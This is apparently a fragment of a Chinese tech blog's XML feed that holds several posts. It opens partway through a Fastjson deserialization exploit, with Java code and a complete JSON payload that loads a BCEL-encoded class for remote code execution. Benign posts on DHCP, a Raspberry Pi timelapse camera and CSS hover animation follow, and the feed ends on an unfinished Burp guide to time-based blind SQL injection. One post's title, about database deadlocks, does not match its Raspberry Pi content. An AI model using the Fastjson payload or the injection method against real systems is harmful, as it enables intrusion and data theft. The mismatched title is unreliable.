Utility.encode(cls.getBytes(),<span style="color: rgba(0, 0, 255, 1)">true</span>);<br>        System.out.println(“<span style="color: rgba(139, 0, 0, 1)">$$BCEL$$</span>“+code);<br>        <span style="color: rgba(0, 128, 0, 1)">&#x2F;&#x2F; 加载类并实例化</span><br>        <span style="color: rgba(0, 0, 255, 1)">new</span> ClassLoader().loadClass(“<span style="color: rgba(139, 0, 0, 1)">$$BCEL$$</span>“+code).newInstance();<br>    }<br>}</pre></div></p><p>执行BCEL.java</p><p><a href="https://img2022.cnblogs.com/blog/1943028/202205/1943028-20220527180817237-779361073.png" rel="noopener"><img width="1865" height="431" title="image" style="display: inline; background-image: none" alt="image" src="https://static.luozhinet.com/4c/39806e5a2db2f04c84c589df256e8e" border="0"></a></p><p><br></p><p>FastjsonTest.java  将上述生成BCEL带入payload</p><div class="cnblogs_code"><pre><span style="color: rgba(0, 0, 255, 1)">import</span> com.alibaba.fastjson.JSON;<p><span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">class</span> FastjsonTest {<br>    <span style="color: rgba(0, 0, 255, 1)">public</span> <span style="color: rgba(0, 0, 255, 1)">static</span> <span style="color: rgba(0, 0, 255, 1)">void</span> main(String[] args) {<br>        String payload &#x3D;<br>                “<span style="color: rgba(139, 0, 0, 1)">{\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">    {\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">        &quot;aaa&quot;: {\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                &quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;,\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                &quot;driverClassLoader&quot;: {\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                    &quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                },\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">                &quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7dS$d9R$TA$U$3dM$s$990$O$86$EQ$W$RQ$96$EB$o$m$88$ac$ca$92r$J$f0$AE$V$85$<em>$c30$92$c1$c9L$w$e9$m$7c$91$cf$bc$40$95T$f9$B$7e$94xz$40$96B$9d$87$5e$ce$3d$e7$de$db$a7$7b$7e$fe$fa$fe$D$c0K$y$Zh$c6P$iY$j$c3$G$o$c8$c5$91$d7$f1$c2$40$M$p$3aF$N$c41f$907$ae$90$J$j$af$M$98$K$89aR$c7k$jS$C$b1$Z$d7w$e5$9c$40$q$9d$d9$U$d0$W$83$5dG$mQt$7dg$b5$5e$deq$aa$h$d6$8eG$qU$Ml$cb$db$b4$aa$ae$da</em>$82$9a$y$b95$81$96$a2$j$94$f3$b5z$c5$a9$96$z$3f$bf$7c$e0z$d3$C$f1$Z$db$bb$cc$z$c8$ed$$$ee$5b$HV$de$N$f2$F$d7sV$DY$I$ea$fe$ee$f2$a1$edT$a4$h$f8$U$b4$5e1$de$af$dd$c4$b5$8a$rK$aa$830$ecY$fe$5e$7e$5dV$5d$7fO$c5$3e$bb$aa$91$fb$b7$92$T$d7$ed$c0$97$8e$<em>$F$9a$Vc$ad$$$xuI$95c$95$F$3an$b1o$c6$a8lZ$97$96$fde$c5$aa$84g$d41Mo$e9$v$ed$a4$7f$C$c6zP$af$daN$n$y$db$a8$8e$9aS$c9L$q$91$S0$97$a6$3e$95$i$cf$Lr$f2$90$b5$cd$9bu$UeF$m$Z$c6$b3$b5$92$V$f8$96$7b$e4$e6$M$81$b6$7f$f5$a34$b3$C$5d$ff$b5$ce$c4$iRl$d4$c4$3c$de$98x$8b$F$5e$c9</em>$ac4$b1$a8zL$de$b9$y$9atm$ed$da$ce$bec$cb$5b$d0$85$db$bc$a0$f4$dd$xP$8f$s$99$bem$bf$c2$S$V$86e$e8$e5F$d5$b2iV$7c$cf$91$LG$d2$e1$83$d1$d2$99m6$Z$fdZu$r$p$d1$f4$f6$82$d2Dm$<em>$a89$e8A$82$cfZ$7d$N$Q$caW$8e$z$dc$e59$L$ce$d1$c1S$88$e30$fc$80c$y$E$e3h$e5h$5e$Q$f0$Q$8fB$ac$ed$8fX$8c$f2$f7$88$S$5bN5$7c$3cCd$8b9$b4b$w$ba$oV$cf$Q$db$g$3a$85$be$fa$N$c6$94$d6$ae$9d$a0q8$7b$C$e3$E$f7$ae$90$a6$e1$T$dc$bf$de$j3Y$S$j$e8b$89$5ed$d9$99$89$JLa$96s$ql$aa$c08XX$edL$b6$93$60CI$b4S$f3$98$aa$Ot$a3$93$ca$t$d4$f6P$dd$8d$R$3ce$86$5e$e6$Y$60$96$3e$ded$3f$96$90$J$P$f5$O$3a$Z$d1P$ad$91$a9V$9d$5c$cd</em>$ad$o$bct$95W$Z0$c9$ac$dd$3ct$C$e3$cc$d9E$93$92$Yc$95gd$3d$t$p$83$d89aMG$af$8e$bep$ec$87$d01$Q$fb$a0$p$j$xp8$a7$a7$ea$T$q$x$97$H$7f$D$5e$f56fq$E$A$A&quot;\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">        }\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">    }:&quot;xxx&quot;\n</span>“<br>                        + “<span style="color: rgba(139, 0, 0, 1)">}</span>“;<br>        JSON.parseObject(payload);<br>    }<br>}<br></pre></div></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> file </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> import </tag>
+            
+            <tag> string </tag>
+            
+            <tag> exec </tag>
+            
+            <tag> 生成 </tag>
+            
+            <tag> bcel </tag>
+            
+            <tag> static </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>HCIA-DHCP</title>
+      <link href="/posts/a61483c5fa74/"/>
+      <url>/posts/a61483c5fa74/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://static.luozhinet.com/78/a865b8f5324c4fdc145050dc2a36f4"></p><p> 动态主机配置协议：</p><p>　　UDP 67 68</p><p>作用：为主机下发IP信息</p><p><img src="https://static.luozhinet.com/c4/08ddeece37be4c25f420a5218a3300"></p><p><img src="https://static.luozhinet.com/dc/b5c05ad32748f57ec8aa9080664d7d"></p><ul><li> 为了获取IP地址等配置信息，DHCP客户端需要和DHCP服务器进行报文交互。</li><li>首先，DHCP客户端发送DHCP发现报文来发现DHCP服务器。DHCP服务器会选取一个未分配的IP地址，向DHCP客户端发送DHCP提供报文。此报文中包含分配给客户端的IP地址和其他配置信息。如果存在多个DHCP服务器，每个DHCP服务器都会响应。</li><li>如果有多个DHCP服务器向DHCP客户端发送DHCP提供报文，DHCP客户端将会选择收到的第一个DHCP提供报文，然后发送DHCP请求报文，报文中包含请求的IP地址。收到DHCP请求报文后，提供该IP地址的DHCP服务器会向DHCP客户端发送一个DHCP确认报文，包含提供的IP地址和其他配置信息。DHCP客户端收到DHCP确认报文后，会发送免费的ARP报文，检查网咯中是否有其他的主机使用分配的IP地址。如果指定时间内没有收到ARP应答，DHCP客户端会使用这个IP地址。如果有主机使用该IP地址，DHCP客户端会向DHCP服务器发送DHCP拒绝报文，通知服务器该IP地址已经被占用。然后DHCP客户端会向服务器重新申请一个IP地址。</li></ul><p><img src="https://static.luozhinet.com/e0/c2e3eedcfd5bc0f8adec5e3155a6f2"></p><p> 配置：</p><p><img src="https://static.luozhinet.com/13/200318f071837e017dbe2685e6c7b3"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 服务器 </tag>
+            
+            <tag> 免费 </tag>
+            
+            <tag> 地址 </tag>
+            
+            <tag> 发送 </tag>
+            
+            <tag> dhcp </tag>
+            
+            <tag> 客户端 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>解决库存扣减及订单创建时防止并发死锁的问题</title>
+      <link href="/posts/460f9997d06f/"/>
+      <url>/posts/460f9997d06f/</url>
+      
+        <content type="html"><![CDATA[<h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h2><blockquote><p>看着阴暗的角落里吃灰噎到嗓子眼的树莓派，一起陪伴的时光历历在目，往事逐渐涌上心头，每每触及此处，内心总会升腾起阵阵怜悯之情…</p></blockquote><p>我这有两个设备，一个是积灰已久的树莓派，另一个是积灰已久的USB摄像头。</p><p>我们今天用这两个设备做一个拍摄监控方案（非视频录制），然后将拍摄好的图片合成视频进行观看。</p><p>主要用到的技术有：树莓派&#x2F;linux操作，crontab，python，ffmpeg。</p><h2 id="【系列目录】"><a href="#【系列目录】" class="headerlink" title="【系列目录】"></a>【系列目录】</h2><ol><li>树莓派驱动usb摄像头（非官方摄像头模块）</li><li>树莓派加载外接USB硬盘</li><li>树莓派拍摄获取素材程序</li><li>树莓派定时任务编写</li><li>将素材图片合成视频</li></ol><h2 id="【实现过程】"><a href="#【实现过程】" class="headerlink" title="【实现过程】"></a>【实现过程】</h2><h4 id="树莓派驱动usb摄像头（非官方摄像头模块）"><a href="#树莓派驱动usb摄像头（非官方摄像头模块）" class="headerlink" title="树莓派驱动usb摄像头（非官方摄像头模块）"></a>树莓派驱动usb摄像头（非官方摄像头模块）</h4><p>首先我们要保证树莓派可以识别usb摄像头设备，使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到usb设备列表第一个即 <em>海康威视1080p</em> usb摄像头，说明我们的摄像头设备被正确识别，如果无法识别，则要排除设备故障或想办法安装设备驱动程序。</p><p>我们使用fswebcam应用来驱动usb摄像头模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fswebcam</span><br><span class="line">sudo apt-get install mplayer</span><br></pre></td></tr></table></figure><p>简单输入拍照命令测试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fswebcam -r 1920*1080 --delay 3 --skip 10 1.jpg</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/68/d30bcb84ecd167082288728939949c" alt="image"></p><p><img src="https://static.luozhinet.com/06/c31781a6cbc5d1d8b0454655251d21" alt="image"></p><p>我们把树莓派上的 1.jpg 下载下来进行查看，成功拍摄到了画面！</p><p><img src="https://static.luozhinet.com/5e/8b6bcf5635c27baafcab938422f312" alt="image"></p><p>我们在使用fswebcam时，增加了几个参数，下面介绍这几个参数的作用：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 1920*1080</td><td>拍摄图片分辨率</td></tr><tr><td>--delay 3</td><td>延时3s后拍摄（给摄像头自动对焦的时间，否则会模糊，这个经常拍照的可以理解吧）</td></tr><tr><td>--skip 10</td><td>作用同上，拍摄时其实会拍摄好多帧，我们跳过前10帧以保证清晰度</td></tr></tbody></table><h4 id="树莓派加载外接USB硬盘"><a href="#树莓派加载外接USB硬盘" class="headerlink" title="树莓派加载外接USB硬盘"></a>树莓派加载外接USB硬盘</h4><p>我们计划编写一个程序来长时间捕捉摄像头画面，那么就需要一个比较大的存储空间来存放我们拍摄的图片，我们从小角落找到一个同样“积灰已久”的固态硬盘。</p><p>windows下使用过的硬盘，推荐格式化成<em>FAT32</em>格式，该格式是兼容Linux系统文件格式的，NTFS格式兼容性不是特别好，可能读写会出问题。</p><blockquote><p>当然直接用linux fdisk命令格式化成 ext2&#x2F;3&#x2F;4 也是可以的，但是后续在windows环境下读写又是新问题，如果硬盘不是准备永久挂载在linux系统下使用，还是建议用<em>FAT32</em>格式使用。</p></blockquote><blockquote><p>windows10&#x2F;11 下已经不提供格式成 <em>FAT32</em> 的入口，我们可以下载奥梅分区助手快速格式化成想要的格式。</p></blockquote><p>使用命令查看固态硬盘是否被识别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到，第二个usb设备便是我们的usb固态硬盘设备了（M.2硬盘放到了USB硬盘盒进行外接）</p><p>使用 fdisk 命令查看硬盘属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/ca/4ead62f47bef4459e3d406d8869cab" alt="image"></p><p>使用 mount 挂载硬盘设备，将磁盘挂载到 &#x2F;mnt&#x2F;sda1 路径下</p><p>虽然网上有很多教程说配置一个配置文件（具体配置我就不说了），然后让设备开机自动挂载，但我个人极不推荐，修改配置文件开机自动挂载虽然貌似一劳永逸，但在硬盘设备发生变更时，大概率因为忘记同步修改配置文件，会造成无法启动系统的严重故障，折腾不说还可能需要重装系统解决…其实启动不频繁情况下，手动装载也不费事。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda3 /mnt/sda1</span><br></pre></td></tr></table></figure><p>然后使用 df 命令查看存储占用详情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/3b/84468b1d130947192a6af2f54e5eec" alt="image"></p><p>可以看到硬盘成功挂载。</p><h4 id="树莓派拍摄获取素材程序"><a href="#树莓派拍摄获取素材程序" class="headerlink" title="树莓派拍摄获取素材程序"></a>树莓派拍摄获取素材程序</h4><p>我们编写一个短小的python脚本来实现以下几点小功能：</p><ul><li>据时间归档目录</li><li>调用api执行拍照，并按时间戳命名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = <span class="string">&#x27;/mnt/sda1&#x27;</span></span><br><span class="line">    <span class="comment"># path = &#x27;E:\code\Project.Python\CameraShoot&#x27;</span></span><br><span class="line">    folder = <span class="string">f&#x27;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder):</span><br><span class="line">        os.mkdir(folder)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拍照</span></span><br><span class="line">    os.system(</span><br><span class="line">        <span class="string">f&#x27;fswebcam -r 1920*1080 --delay 3 --skip 10 <span class="subst">&#123;folder&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)&#125;</span>.jpg&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h4 id="树莓派定时任务编写"><a href="#树莓派定时任务编写" class="headerlink" title="树莓派定时任务编写"></a>树莓派定时任务编写</h4><p>我们使用 linux 环境下的 crontab 编写定时任务，来定时执行拍照任务（初步定每分钟拍一张）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * python /7tiny/camera_shoot.py</span><br></pre></td></tr></table></figure><p>采用定时任务，每分钟自动调度执行我们写好的python脚本，来进行拍照任务的执行</p><p>等待一段时间后，便可拿到拍摄素材…</p><p><img src="https://static.luozhinet.com/bf/98d9ef3a8b54c1fc38bd89e5893bf7" alt="image"></p><p><img src="https://static.luozhinet.com/3e/b29151741bc38c17762c7ac9681d08" alt="image"></p><h4 id="将素材图片合成视频"><a href="#将素材图片合成视频" class="headerlink" title="将素材图片合成视频"></a>将素材图片合成视频</h4><p>我们先简单从树莓派上下载下来拍摄好的图片，在 windows 上简单合成一个视频，完成我们的任务目标，后期可以根据需要在树莓派上自动合成。</p><p>我们用 ffmpeg 软件将图片合成为视频。</p><p>首先下载 ffmpeg 软件的 exe 版本（windows），linux上可直接下载linux版。</p><p>然后将解压后 ffmpeg 的 exe 目录添加到环境变量，方便我们执行命令。</p><p>将树莓派上的图片下载下来。</p><p><img src="https://static.luozhinet.com/0e/2087bb6f73079f8085b5de7fc1cc66" alt="image"></p><p>下载下来的图片我们是默认使用时间戳来命名图片的，因为ffmpeg只能从 0 - n 顺序识别图片，无法识别时间戳这种命名，因此，我这里自己编写了一个工具将图片名称替换成了 0 - n.jpg。</p><p>有需要的同学可以在文末获取到工具源码及下载地址。</p><p>重命名好后，我们执行命令压缩图片为 mp4 文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -r <span class="number">10</span> -f image2 -i %d.jpg -vcodec libx264 -pix_fmt yuv420p out.mp4</span><br></pre></td></tr></table></figure><p>同样我们介绍下使用的几个参数：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 10</td><td>视频为每秒10帧，可以根据需要调整，10帧就是10张图片</td></tr><tr><td>%d</td><td>从0开始在当前目录递增寻找图片</td></tr><tr><td>-vcodec libx264（windows兼容）</td><td></td></tr><tr><td>-vcodec libx265（体积更小，windows默认不支持）</td><td>视频压缩参数</td></tr><tr><td>-pix_fmt yuv420p</td><td>视频编码格式（windows下播放兼容）</td></tr></tbody></table><p>执行后，我们便可查看到图片被拼接成为 mp4 格式的视频。</p><p><img src="https://static.luozhinet.com/e2/635305b8ad961ffad26395b53a4fc8" alt="image"></p><p><img src="https://static.luozhinet.com/c6/57431b6621e6f56c8c111dcae343ea" alt="image"></p><h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>本文通过短小的代码片段初步使用树莓派+usb摄像头进行环境捕捉，在此基础上，可以进行很多额外的场景扩展及使用优化。</p><h2 id="【源码地址】"><a href="#【源码地址】" class="headerlink" title="【源码地址】"></a>【源码地址】</h2><p>重命名工具源码及编译后绿色程序：<br><a href="https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe">https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 创建 </tag>
+            
+            <tag> 数据库 </tag>
+            
+            <tag> 处理 </tag>
+            
+            <tag> 资源 </tag>
+            
+            <tag> 运行 </tag>
+            
+            <tag> exec </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 帐号 </tag>
+            
+            <tag> var </tag>
+            
+            <tag> sys </tag>
+            
+            <tag> sqlclient </tag>
+            
+            <tag> dbo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>妙啊！动画还可以这样控制？</title>
+      <link href="/posts/1828bd23838c/"/>
+      <url>/posts/1828bd23838c/</url>
+      
+        <content type="html"><![CDATA[<p>今天，有在群里看到这样一个问题：<strong>有一个动画，一开始静止处于第一帧，只在用户 hover 的时候运行动画，在运行一次后停止，并且停留在最后一帧</strong>，使用 CSS 可以完成么？</p><p>像是这样：</p><p><img src="https://static.luozhinet.com/4e/f9ff699ab8a57ff8ee2dfd3f4cb1ab"></p><p>一个非常有意思的问题，答案是可以的。我们抽取一下其中的关键点：</p><ol><li>动画只运行一次，未运行前处于第一帧，运行完后处于最后一帧</li><li>动画通过 hover 驱动，只有用户 hover 元素的时候，动画才进行</li></ol><h2 id="animation-fill-mode-控制元素在各个阶段的状态"><a href="#animation-fill-mode-控制元素在各个阶段的状态" class="headerlink" title="animation-fill-mode 控制元素在各个阶段的状态"></a>animation-fill-mode 控制元素在各个阶段的状态</h2><p>首先，动画只运行一次，未运行前处于第一帧，运行完后处于最后一帧。</p><p>这个刚好利用 CSS 动画的 <code>animation-fill-mode: both</code> 即可。</p><ol><li><code>animation-fill-mode: backwards</code>：可以让元素在动画开始之前的样式为动画运行时的第一帧，动画结束后的样式则恢复为 CSS 规则设定的样式</li><li><code>animation-fill-mode: forwards</code>：元素在动画开始之前的样式为 CSS 规则设定的样式，而动画结束后的样式则表现为由执行期间遇到的最后一个关键帧计算值（也就是停在最后一帧）</li></ol><p>而，<code>animation-fill-mode: both</code> 兼顾了上面两种模式的特点，可以使得<strong>动画开始前的样式为动画运行时的第一帧，动画结束后停在最后一帧</strong>。</p><h2 id="反向利用-animation-play-state-实现-hover-触发动画行进"><a href="#反向利用-animation-play-state-实现-hover-触发动画行进" class="headerlink" title="反向利用 animation-play-state 实现 hover 触发动画行进"></a>反向利用 animation-play-state 实现 hover 触发动画行进</h2><p>而<strong>动画通过 hover 驱动，只有用户 hover 元素的时候，动画才进行</strong>这一点，利用 <code>animation-play-state</code> 即可。</p><p>我们都知道，正常情况下，动画应该是运行状态，那如果我们将动画的默认状态设置为暂停，只有当鼠标点击或者 hover 的时候，才设置其 <code>animation-play-state: running</code>，这样就可以利用 hover 控制动画的行进！</p><p>基于上述两点，我们来实现一个有意思的打字动画，做到动画只触发单次，并且只有 hover 的时候动画会运行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Hover Me - You are a pig!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">font-family</span>: monospace;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">26ch</span>;</span><br><span class="line">    <span class="attribute">animation</span>: typing <span class="number">3s</span> <span class="built_in">steps</span>(<span class="number">15</span>, end);</span><br><span class="line">    <span class="attribute">animation-fill-mode</span>: both;</span><br><span class="line">    <span class="attribute">animation-play-state</span>: paused;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">:hover</span>  &#123;</span><br><span class="line">    <span class="attribute">animation-play-state</span>: running;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">p</span><span class="selector-pseudo">::before</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">animation</span>: blink .<span class="number">8s</span> linear infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> blink &#123;</span><br><span class="line">    <span class="number">0%</span>, <span class="number">50%</span> &#123;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">4px</span> solid transparent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="number">50%</span>, <span class="number">100%</span> &#123;</span><br><span class="line">        <span class="attribute">border-right</span>: <span class="number">4px</span> solid <span class="number">#000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> typing &#123;</span><br><span class="line">    <span class="selector-tag">from</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">11ch</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-tag">to</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">26ch</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下，展示这样一个界面：</p><p><img src="https://static.luozhinet.com/97/ea0ade36df39a0fbfedb201c7b40d2"></p><p>接下来，我们把鼠标放上去，看看会发生什么：</p><p><img src="https://static.luozhinet.com/90/b12f7e81f7a699a11e957b226a3b66"></p><p>有意思，完美的实现了上面说的要求 – <strong>动画通过 hover 驱动，只有用户 hover 元素的时候，动画才进行</strong>。</p><p>当然，这里还运用了几个小技巧，一并解释下：</p><ol><li>打字动画运用了逐帧动画，而不是补间动画，主要利用了 CSS 动画的 <code>step-timing-function</code> 步骤缓动函数，也就是代码中的 <code>steps(15, end)</code></li><li><code>ch</code> 是 CSS 当中的一个相对单位，这一单位代表元素所用字体 font 中 “0” 这一字形的宽度</li><li><code>font-family: monospace</code> 表示等宽字体，每个字符占据的宽度是一样，因为我们使用了 <code>26ch</code> 来充当 <code>&lt;p&gt;</code> 元素的宽度，而 <code>Hover Me - You are a pig</code> 这一段文字算上空格刚好 26 个字符，<code>26ch</code> 刚好表示这一段文本的长度</li><li>一开始展示的文本 <code>Hover me -</code> 算上空格是 <code>11ch</code> 宽度，而最后整个文本展示完需要 <code>26ch</code> 的宽度，中间需要经过 15 步的逐帧动画，这里的元素刚好和代码中的一一对应上</li></ol><p>借助上面 4 步及搭配我们上文介绍的 <code>animation-fill-mode: both</code>、<code>animation-play-state: paused</code> 的应用，我们就完美的实现了这样一个非常有意思的打字动画。</p><p>完整的代码，你可以戳这里 <a href="https://codepen.io/Chokcoco/pen/QWQNJyp">CodePen Demo – running once animation by hover</a></p><p>如果你想对 CSS 动画有更深入细致的了解，可以翻看我的这篇文章，对动画的每一个属性都有着十分细致的讲解：<a href="https://github.com/chokcoco/iCSS/issues/141">深入浅出 CSS 动画</a></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>OK，本文到此结束，希望本文对你有所帮助</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 长度 </tag>
+            
+            <tag> 对应 </tag>
+            
+            <tag> 界面 </tag>
+            
+            <tag> 运行 </tag>
+            
+            <tag> 代码 </tag>
+            
+            <tag> 动画 </tag>
+            
+            <tag> hover </tag>
+            
+            <tag> css </tag>
+            
+            <tag> 样式 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Burp半自动时间盲注</title>
+      <link href="/posts/d43963b37c5e/"/>
+      <url>/posts/d43963b37c5e/</url>
+      
+        <content type="html"><![CDATA[<p><strong>直接开始</strong>  </p><p>实战中碰到延时的注入点，一个一个测太麻烦，Python脚本又不会写，那我们就善用Burp。</p><p>首先要构造好注入语句，接着使用<code>Burp</code>抓包</p><p><img src="https://static.luozhinet.com/8c/e361226b0a9109a724e236398c42d8&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="1.png"><br>发送到爆破模块<br><img src="https://static.luozhinet.com/a4/cef53c847afb5fa4225eb23b1ffe65&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="2.png"><br>去掉所有变量<br><img src="https://static.luozhinet.com/14/b2ec78fef9709f85183918b09a1815"></p><p> 设置两个变量</p><p>第一个是数据库的名字位，第二个是数据库名字符对应的ASCII码<br><img src="https://static.luozhinet.com/b0/57779620782a2e897eb9728ed119ff&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="4.png"><br>爆破两个变量 选择<code>Cluster bomb</code>模式<br><img src="https://static.luozhinet.com/5e/53f5285181247f3a6059b3231966de&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="5.png"><br>设置payload<br>第一个Payload是数据库的名字位</p><p>一共有5位，那么我们设置1~5即可<br><img src="https://static.luozhinet.com/66/2d1edec80a43c6f1139c532f3c557f&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" title="6.png"><br>第二个Payload是数据库名字对应的ASCII码，ASCII码最大为127</p><p><img src="https://static.luozhinet.com/b6/0d46f6f7ebb5a95076d2f143685d17&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"><br>那么设置的Payload为1~127</p><p>(如果前面没选择<code>Cluster bomb</code>模式，Payload 